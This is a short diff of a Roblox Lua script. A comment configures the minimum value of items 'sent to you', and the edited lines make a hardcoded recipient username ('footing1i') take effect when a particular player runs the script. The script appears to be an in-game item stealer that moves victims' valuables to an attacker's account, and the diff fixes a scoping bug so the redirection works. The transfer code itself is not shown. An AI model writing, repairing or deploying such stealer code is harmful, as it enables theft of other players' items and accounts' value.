@@ -60,7 +60,7 @@ min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
 local player = game:GetService"Players".LocalPlayer
 if player.name == "zgrind_3" then
-	local Username = "footing1i"
+	Username = "footing1i"
 end
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
